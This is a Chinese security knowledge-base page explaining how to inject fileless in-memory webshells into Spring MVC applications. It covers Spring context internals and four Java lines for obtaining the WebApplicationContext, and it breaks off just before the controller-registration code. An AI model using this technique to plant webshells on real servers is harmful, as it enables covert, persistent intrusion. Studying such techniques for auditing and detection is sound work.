<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/内存马/Spring内存马" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Spring内存马 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Spring内存马"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Spring内存马 | d4m1ts 知识库"><meta data-rh="true" name="description" content="前言"><meta data-rh="true" property="og:description" content="前言"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Spring内存马"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Spring内存马" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Spring内存马" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml">

<link rel="preconnect" href="https://hm.baidu.com">
<script src="https://hm.baidu.com/hm.js?3675030a9721336abea8cd0e46b3f76b" async></script>
<script>window._hmt||(window._hmt=[])</script><link rel="stylesheet" href="/assets/css/styles.74d3050c.css">
<script src="/assets/js/runtime~main.06513570.js" defer="defer"></script>
<script src="/assets/js/main.9542b26a.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="navbar__items navbar__items--right"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">在线Markdown</a><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Reverse Shell Generator</a><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GTFOBins</a><a class="navbar__item navbar__link" href="/friends">友情链接</a><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="展开侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="展开侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="折叠侧边栏分类 &#x27;内存马&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/内存马/Tomcat内存马">Tomcat内存马</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/内存马/Spring内存马">Spring内存马</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/内存马/Java Agent 内存马">Java Agent 内存马</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/代码审计/"><span itemprop="name">代码审计</span></a><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/内存马"><span itemprop="name">内存马</span></a><meta itemprop="position" content="3"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Spring内存马</span><meta itemprop="position" content="4"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Spring内存马</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="前言">前言<a href="#前言" class="hash-link" aria-label="前言的直接链接" title="前言的直接链接">​</a></h2>
<p>之前学习了Tomcat的内存马，但是Spring也是比较常用的框架，所以大佬们重点研究了 SpringMVC，并实现了利用多种不同的技术手段，往内存中注入恶意 Webshell 代码的无文件攻击技术。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="基础知识">基础知识<a href="#基础知识" class="hash-link" aria-label="基础知识的直接链接" title="基础知识的直接链接">​</a></h2>
<p>具体可以过一下<code>SpringMVC</code>的开发，基于框架开发比较便捷和简单</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="bean">Bean<a href="#bean" class="hash-link" aria-label="Bean的直接链接" title="Bean的直接链接">​</a></h3>
<p>bean是Spring 框架的一个核心概念，它是构成应用程序的主干，并且是由 Spring IoC 容器负责实例化、配置、组装和管理的对象。</p>
<blockquote>
<p>在Spring的IoC容器中，我们把所有组件统称为JavaBean，即配置一个组件就是配置一个Bean。</p>
</blockquote>
<p>通俗来讲：</p>
<ul>
<li>bean 是对象</li>
<li>bean 被 IoC 容器管理</li>
<li>Spring 应用主要是由一个个的 bean 构成的</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="applicationcontext">ApplicationContext<a href="#applicationcontext" class="hash-link" aria-label="ApplicationContext的直接链接" title="ApplicationContext的直接链接">​</a></h3>
<p><code>ApplicationContext</code>是 spring 中较高级的容器。和 BeanFactory 类似，它可以加载配置文件中定义的 bean，将所有的 bean 集中在一起，当有请求的时候分配 bean。 另外，它增加了企业所需要的功能，比如，从属性文件从解析文本信息和将事件传递给所指定的监听器。</p>
<p><code>ApplicationContext</code> 接口继承了 <code>BeanFactory</code> 接口，并通过继承其他接口进一步扩展了基本容器的功能。</p>
<p><img decoding="async" loading="lazy" alt="image-20211124110821765" src="/assets/images/image-20211124110821765-c1e0e8483568cd77d18940df3663ad59.png" width="2520" height="524" class="img_ev3q"></p>
<p>因此，<code>org.springframework.context.ApplicationContext</code>接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖。</p>
<p>IoC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="其他">其他<a href="#其他" class="hash-link" aria-label="其他的直接链接" title="其他的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="root-context-和-child-context">Root Context 和 Child Context<a href="#root-context-和-child-context" class="hash-link" aria-label="Root Context 和 Child Context的直接链接" title="Root Context 和 Child Context的直接链接">​</a></h4>
<ul>
<li>Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context</li>
<li>所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean</li>
<li>所有的Context在创建后，都会被作为一个属性添加到了 ServletContext 中</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="contextloaderlistener">ContextLoaderListener<a href="#contextloaderlistener" class="hash-link" aria-label="ContextLoaderListener的直接链接" title="ContextLoaderListener的直接链接">​</a></h4>
<p><code>ContextLoaderListener</code> 主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext。这个 Root WebApplicationContext 会和其他 Child Context 实例共享它的 IoC 容器，供其他 Child Context 获取并使用容器中的 bean</p>
<p><img decoding="async" loading="lazy" alt="image-20211124113556473" src="/assets/images/image-20211124113556473-8ac12d671c2ded0fcad1f4333948d0a0.png" width="1864" height="1344" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="dispatcherservlet">DispatcherServlet<a href="#dispatcherservlet" class="hash-link" aria-label="DispatcherServlet的直接链接" title="DispatcherServlet的直接链接">​</a></h4>
<p><code>DispatcherServlet</code> 的主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View。<code>DispatcherServlet</code> 初始化完成后，会创建一个普通的 Child Context 实例。</p>
<p>从下面的继承关系图中可以发现： <code>DispatcherServlet</code> 从本质上来讲是一个 <code>Servlet</code>（扩展了 HttpServlet )。</p>
<p><img decoding="async" loading="lazy" alt="image-20211124113757352" src="/assets/images/image-20211124113757352-78afc6c9b1d55928198671893175f012.png" width="1154" height="288" class="img_ev3q"></p>
<hr>
<p>每个具体的 <code>DispatcherServlet</code> 创建的是一个 Child Context，代表一个独立的 IoC 容器；而 <code>ContextLoaderListener</code> 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器。</p>
<p>如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC容器，代表者 <code>ApplicationContext</code>。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="controller实现方式">Controller实现方式<a href="#controller实现方式" class="hash-link" aria-label="Controller实现方式的直接链接" title="Controller实现方式的直接链接">​</a></h2>
<p>要达到访问一个URL，访问到内存中的Webshell获得回显的效果，主要的方式如下：</p>
<ol>
<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境；</li>
<li>在不使用注解和修改配置文件的情况下，使用纯 java 代码在上下文环境中手动注册一个 controller；</li>
<li>controller 中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果</li>
</ol>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="controller技术实现">Controller技术实现<a href="#controller技术实现" class="hash-link" aria-label="Controller技术实现的直接链接" title="Controller技术实现的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="获取上下文的环境">获取上下文的环境<a href="#获取上下文的环境" class="hash-link" aria-label="获取上下文的环境的直接链接" title="获取上下文的环境的直接链接">​</a></h3>
<p>大佬提供了4种方法：</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>我都试了一下，<code>spring-boot-starter-parent 2.4.3</code>中只有第四种方法可以成功获得Context</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20211124154902644" src="/assets/images/image-20211124154902644-ec67bb0f20dd3f9e54d5291e68af977a.png" width="948" height="1170" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="手动注册controller">手动注册Controller<a href="#手动注册controller" class="hash-link" aria-label="手动注册Controller的直接链接" title="手动注册Controller的直接链接">​</a></h3>
<hr>
<p>处理 URL 映射相关的类都实现了 <code>HandlerMapping</code> 接口</p>
<ul>
<li>
<p>Spring 2.5 开始到 Spring 3.1 之前一般使用<code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code> 映射器 ；</p>
</li>
<li>
<p>Spring 3.1 开始及以后一般开始使用新的<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code> 映射器来支持<a href="https://github.com/Contoller" target="_blank" rel="noopener noreferrer">@Contoller</a>和<a href="https://github.com/RequestMapping" target="_blank" rel="noopener noreferrer">@RequestMapping</a>注解。</p>
</li>
</ul>
<p><img decoding="async" loading="lazy" alt="image-20211124160731685" src="/assets/images/image-20211124160731685-03b1877a739b66786c13f06b3b320f84.png" width="1190" height="314" class="img_ev3q"></p>
<p>当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 bean。又因版本不同和较多的接口等原因，手工注册动态 controller 的方法不止一种。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="方法一">方法一<!-- -->:registerMapping<a href="#方法一" class="hash-link" aria-label="方法一的直接链接" title="方法一的直接链接">​</a></h4>
<p>在 spring 4.0 及以后，可以使用 registerMapping 直接注册 requestMapping ，这是最直接的一种方式。</p>
<p>相关示例代码和解释如下：</p>
